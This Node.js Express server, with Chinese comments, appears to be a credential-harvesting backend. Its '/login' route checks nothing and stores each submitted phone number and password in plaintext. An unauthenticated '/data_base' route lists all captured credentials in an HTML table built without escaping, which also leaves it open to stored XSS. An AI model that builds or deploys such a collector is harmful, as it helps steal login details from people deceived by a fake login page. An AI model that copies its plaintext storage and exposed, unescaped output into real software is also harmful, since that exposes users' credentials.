const express = require('express');
const app = express();
const path = require('path');
const port = 3000;
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser'); 

const db = new sqlite3.Database('db/sqlite.db', (err) => {
    if (err) {
        return console.error(err.message);
    }
    console.log('Connected to the SQLite database.');
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'public')));

// 處理獲取用戶電話跟密碼的路由
app.post('/login', (req, res) => {
    const phoneNumber = req.body.phone; // 取得電話號碼
    const password = req.body.password; // 取得密碼

    //將電話號碼和密碼放到數據庫中的 users 表格中
    db.run('INSERT INTO users (phone_number, password) VALUES (?, ?)', [phoneNumber, password], (err) => {
        if (err) {
            console.error(err.message);
            res.status(500).send('Error inserting data into database');
            return;
        }
        res.status(200).send('Successfully inserted data into database');
    });
});

app.get('/data_base', (req, res) => {
    // 查詢數據庫中所有數據
    db.all('SELECT * FROM users', (err, rows) => {
        if (err) {
            console.error(err.message);
            res.status(500).send('Error retrieving data from database');
            return;
        }
        // 建表
        let tableHtml = '<table border="1">';
        tableHtml += '<tr><th>電話號碼</th><th>密碼</th></tr>';
        rows.forEach(row => {
            tableHtml += `<tr><td>${row.phone_number}</td><td>${row.password}</td></tr>`;
        });
        tableHtml += '</table>';
        // 將表回傳
        res.send(tableHtml);
    });
});



//  設置 Express 監聽端口
app.listen(port, () => {
    console.log(`Example app listening on port ${port}`);
});
